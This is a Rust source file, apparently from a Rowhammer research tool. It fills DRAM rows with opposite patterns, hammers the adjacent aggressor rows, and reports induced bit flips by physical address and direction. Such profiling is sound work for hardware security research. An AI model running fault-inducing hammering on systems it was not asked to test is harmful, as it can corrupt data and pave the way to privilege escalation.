use crate::alloc::virt_to_phys_pagemap;
use crate::architecture::DramAddr;
use crate::config::Config;
use crate::hammer::hammer;
use crate::memmap::{DramRange, MemMap};
use crate::profile::Direction::{From0To1, From1To0};

#[derive(Debug, Clone, Copy)]
pub(crate) enum Direction {
    From1To0,
    From0To1,
}

#[derive(Debug, Clone)]
pub(crate) struct Flip {
    pub(crate) dir: Direction,
    pub pos : DramAddr,
}

fn fill_ranges(mem: &mut MemMap, rs: &Vec<DramRange>, p: u8, c: &Config) {
    for r in rs {
        let start_off = mem.dram_to_offset(&r.start, c);
        //let v_arr = unsafe { std::slice::from_raw_parts_mut(v_addr as *mut u8, r.bytes) };
        for i in 0..r.bytes {
            mem[start_off + i] = p;
        }
    }
}

fn find_flips(da: DramAddr, mut expected: u8, mut actual: u8) -> Vec<Flip> {
    let mut flips = Vec::new();
    for bit in 0..8 {
        if expected & 1 != actual & 1 {
            let dir = if expected & 1 == 1 {
                From1To0
            } else {
                From0To1
            };
            let mut da_flip = da.clone();
            da_flip.bit = bit;
            flips.push(Flip { dir, pos : da_flip})
        }
        expected >>= 1;
        actual >>= 1;
    }
    flips
}

fn flips_in_range(mem: &MemMap, v: &DramRange, expected: u8, c: &Config) -> Vec<Flip> {
    let mut flips = Vec::new();
    let base = mem.dram_to_offset(&v.start, c);

    for i in 0..v.bytes {
        let actual = mem[base + i];

        if actual != expected {
            println!(
                "Bit flip at physical address: {:p}",
                virt_to_phys_pagemap(&mem[base + i]).unwrap_or(std::usize::MAX) as *const usize
            );

            let mut cur_flips = find_flips(mem.offset_to_dram(base + i, &c), expected, actual);
            for f in &cur_flips {
                println!("Bit: {}, Dir: {:?}", f.pos.bit, f.dir);
            }
            flips.append(&mut cur_flips);
        }
    }
    flips
}

pub(crate) fn profile_addr(mem: &mut MemMap, da: DramAddr, p: u8, c: &Config) -> Vec<Flip> {
    let mut da_above = da.clone();
    let mut da_below = da.clone();
    da_above.row -= 1;
    da_below.row += 1;

    let row_above = vec![DramRange {
        start: da_above.clone(),
        bytes: 1,
    }];
    let row_below = vec![DramRange {
        start: da_below.clone(),
        bytes: 1,
    }];
    let row = vec![DramRange {
        start: da.clone(),
        bytes: 1,
    }];
    fill_ranges(mem, &row_above, p, c);
    fill_ranges(mem, &row, !p, c);
    fill_ranges(mem, &row_below, p, c);
    let a1 = mem.dram_to_virt( &da_above, c);
    let a2 = mem.dram_to_virt(&da_below, c);
    //println!("profiling ({}, {}, {}, {}): row {}, pattern {}, {}, {}", start.chan, start.dimm, start.rank, start.bank, v[0].start.row, p, !p, p);
    hammer(a1, a2, c.reads_per_hammer);


    let mut flips = Vec::new();
    flips.append(&mut flips_in_range(
        mem,
        &DramRange {
            start: da,
            bytes: 1,
        },
        !p,
        c,
    ));

    flips
}

pub(crate) fn profile_ranges(
    mem: &mut MemMap,
    r1: &Vec<DramRange>,
    r2: &Vec<DramRange>,
    v: &Vec<DramRange>,
    p: u8,
    c: &Config,
) -> Vec<Flip> {
    //println!("{:#?}", r1);
    //println!("{:#?}", r2);
    //println!("{:#?}", v);

    let mut flips = Vec::new();
    if let (Some (a1), Some(a2)) = (r1.get(0), r2.get(0)){
        fill_ranges(mem, r1, p, c);
        fill_ranges(mem, v, !p, c);
        fill_ranges(mem, r2, p, c);

        let a1 = mem.dram_to_virt(&a1.start, c);
        let a2 = mem.dram_to_virt( &a2.start, c);
        hammer(a1, a2, c.reads_per_hammer);

        for v_range in v {
            flips.append(&mut flips_in_range(mem, v_range, !p, c));
        }

    }
    flips
}
